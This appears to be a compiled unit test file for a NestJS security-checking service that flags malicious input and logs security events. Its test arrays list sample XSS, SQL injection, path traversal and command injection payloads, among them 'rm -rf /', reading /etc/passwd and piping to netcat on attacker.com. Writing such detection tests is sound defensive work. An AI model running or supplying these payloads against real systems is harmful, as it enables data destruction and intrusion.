import { ConfigService } from "../../../MediaStream/Config/config.service.js";
import { SecurityCheckerService } from "../../../MediaStream/Validation/services/security-checker.service.js";
import { Test } from "@nestjs/testing";
import { beforeEach, describe, expect, it, vi } from "vitest";
describe('securityCheckerService', ()=>{
    let service;
    let configService;
    beforeEach(async ()=>{
        const mockConfigService = {
            getOptional: vi.fn()
        };
        const module = await Test.createTestingModule({
            providers: [
                SecurityCheckerService,
                {
                    provide: ConfigService,
                    useValue: mockConfigService
                }
            ]
        }).compile();
        service = module.get(SecurityCheckerService);
        configService = module.get(ConfigService);
        // Setup default config responses
        configService.getOptional.mockImplementation((key, defaultValue)=>{
            const configs = {
                'validation.maxStringLength': 10000
            };
            return configs[key] || defaultValue;
        });
    });
    it('should be defined', ()=>{
        expect(service).toBeDefined();
    });
    describe('checkForMaliciousContent', ()=>{
        it('should detect script injection attempts', async ()=>{
            const maliciousInputs = [
                '<script>alert("xss")</script>',
                'javascript:alert(1)',
                'vbscript:msgbox("evil")',
                'data:text/html,<script>alert(1)</script>',
                'onclick="alert(1)"'
            ];
            for (const input of maliciousInputs){
                const result = await service.checkForMaliciousContent(input);
                expect(result).toBe(true);
            }
        });
        it('should detect SQL injection attempts', async ()=>{
            const maliciousInputs = [
                '\'; DROP TABLE users; --',
                'UNION SELECT * FROM passwords',
                'INSERT INTO admin VALUES',
                'DELETE FROM users WHERE'
            ];
            for (const input of maliciousInputs){
                const result = await service.checkForMaliciousContent(input);
                expect(result).toBe(true);
            }
        });
        it('should detect path traversal attempts', async ()=>{
            const maliciousInputs = [
                '../../../etc/passwd',
                '..\\..\\windows\\system32',
                '%2e%2e%2f%2e%2e%2f',
                '%2e%2e%5c%2e%2e%5c'
            ];
            for (const input of maliciousInputs){
                const result = await service.checkForMaliciousContent(input);
                expect(result).toBe(true);
            }
        });
        it('should detect command injection attempts', async ()=>{
            const maliciousInputs = [
                '; rm -rf /',
                '; cat /etc/passwd',
                '| nc attacker.com 4444',
                '; ls -la'
            ];
            for (const input of maliciousInputs){
                const result = await service.checkForMaliciousContent(input);
                expect(result).toBe(true);
            }
        });
        it('should allow safe content', async ()=>{
            const safeInputs = [
                'Hello World',
                'user@example.com',
                'https://example.com/image.jpg',
                'Normal text with numbers 123',
                {
                    name: 'John',
                    age: 30
                }
            ];
            for (const input of safeInputs){
                const result = await service.checkForMaliciousContent(input);
                expect(result).toBe(false);
            }
        });
        it('should detect excessively long strings', async ()=>{
            const longString = 'a'.repeat(15000);
            const result = await service.checkForMaliciousContent(longString);
            expect(result).toBe(true);
        });
        it('should detect high entropy strings (potential encoded payloads)', async ()=>{
            // Base64 encoded string with high entropy
            const highEntropyString = 'SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0IHN0cmluZyB3aXRoIGhpZ2ggZW50cm9weQ==';
            const result = await service.checkForMaliciousContent(highEntropyString);
            expect(result).toBe(true);
        });
        it('should handle objects and detect prototype pollution', async ()=>{
            const maliciousObject = {
                __proto__: {
                    admin: true
                },
                constructor: {
                    prototype: {
                        admin: true
                    }
                },
                prototype: {
                    admin: true
                }
            };
            const result = await service.checkForMaliciousContent(maliciousObject);
            expect(result).toBe(true);
        });
        it('should detect excessively deep objects', async ()=>{
            const deepObject = {};
            let current = deepObject;
            // Create object with depth > 10
            for(let i = 0; i < 15; i++){
                current.nested = {};
                current = current.nested;
            }
            const result = await service.checkForMaliciousContent(deepObject);
            expect(result).toBe(true);
        });
        it('should handle arrays recursively', async ()=>{
            const maliciousArray = [
                'safe content',
                '<script>alert("xss")</script>',
                'more safe content'
            ];
            const result = await service.checkForMaliciousContent(maliciousArray);
            expect(result).toBe(true);
        });
        it('should handle null and undefined safely', async ()=>{
            expect(await service.checkForMaliciousContent(null)).toBe(false);
            expect(await service.checkForMaliciousContent(undefined)).toBe(false);
        });
    });
    describe('logSecurityEvent', ()=>{
        it('should log security events', async ()=>{
            const event = {
                type: 'malicious_content',
                source: 'test',
                details: {
                    input: 'test'
                },
                timestamp: new Date(),
                clientIp: '127.0.0.1',
                userAgent: 'test-agent'
            };
            await service.logSecurityEvent(event);
            const events = service.getSecurityEvents(1);
            expect(events).toHaveLength(1);
            expect(events[0]).toMatchObject(event);
        });
        it('should add timestamp if not provided', async ()=>{
            const event = {
                type: 'invalid_url',
                source: 'test',
                details: {
                    url: 'test'
                }
            };
            await service.logSecurityEvent(event);
            const events = service.getSecurityEvents(1);
            expect(events[0].timestamp).toBeInstanceOf(Date);
        });
        it('should limit stored events to 1000', async ()=>{
            // Add more than 1000 events
            for(let i = 0; i < 1100; i++){
                await service.logSecurityEvent({
                    type: 'malicious_content',
                    source: 'test',
                    details: {
                        index: i
                    }
                });
            }
            const events = service.getSecurityEvents(2000);
            expect(events.length).toBeLessThanOrEqual(1000);
        });
    });
    describe('getSecurityStats', ()=>{
        it('should return security statistics', async ()=>{
            // Add some test events
            await service.logSecurityEvent({
                type: 'malicious_content',
                source: 'test',
                details: {}
            });
            await service.logSecurityEvent({
                type: 'invalid_url',
                source: 'test',
                details: {}
            });
            await service.logSecurityEvent({
                type: 'malicious_content',
                source: 'test',
                details: {}
            });
            const stats = service.getSecurityStats();
            expect(stats.totalEvents).toBe(3);
            expect(stats.eventsByType.malicious_content).toBe(2);
            expect(stats.eventsByType.invalid_url).toBe(1);
            expect(typeof stats.recentEvents).toBe('number');
        });
        it('should count recent events correctly', async ()=>{
            const now = new Date();
            const twoHoursAgo = new Date(now.getTime() - 2 * 60 * 60 * 1000);
            // Add old event
            await service.logSecurityEvent({
                type: 'malicious_content',
                source: 'test',
                details: {},
                timestamp: twoHoursAgo
            });
            // Add recent event
            await service.logSecurityEvent({
                type: 'invalid_url',
                source: 'test',
                details: {},
                timestamp: now
            });
            const stats = service.getSecurityStats();
            expect(stats.recentEvents).toBe(1); // Only the recent event
        });
    });
});

//# sourceMappingURL=security-checker.service.spec.js.map